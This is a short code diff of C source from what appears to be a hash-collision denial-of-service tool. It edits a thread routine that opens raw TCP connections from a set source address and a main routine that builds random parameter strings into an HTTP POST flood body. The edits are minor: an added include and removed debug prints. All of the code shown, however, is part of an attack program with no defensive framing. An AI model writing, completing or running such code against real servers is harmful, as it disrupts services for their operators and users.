@@ -3,6 +3,7 @@
 #include "base/subnet_mask.h"
 #include "base/time_check.h"
 #include "ddos/hash_dos.h"
+#include "base/make_tcp.h"
 
 extern int g_num_threads;
 
@@ -52,6 +53,7 @@ void *generate_hash_dos(void *data)
 		// make socket
 		int src_port,seq,ack;
 		int sock;
+
 		sock =  tcp_make_connection(
 				inet_addr(g_hash_dos_now.src),
 				inet_addr(g_hash_dos_now.dest),
@@ -138,7 +140,7 @@ void hash_dos_main(char *argv[])
 		arg[14] = rand() % 26 + 'a';
 		arg[15] = rand() % 26 + 'A';
 		arg[16] = rand() % 26 + 'a';
-		printf("%d\n",i);
+
 		for(j=0;j<21;j++)
 		{
 			hash_dos_content[index+j] = arg[j];
@@ -146,7 +148,6 @@ void hash_dos_main(char *argv[])
 		index+=20;
 	}
 	hash_dos_content[index] = '\0';
-	printf("IN HERE!\n");
 
 	sprintf(hash_dos_method,
 		"POST / HTTP/1.1\r\nHost: %s\r\n"
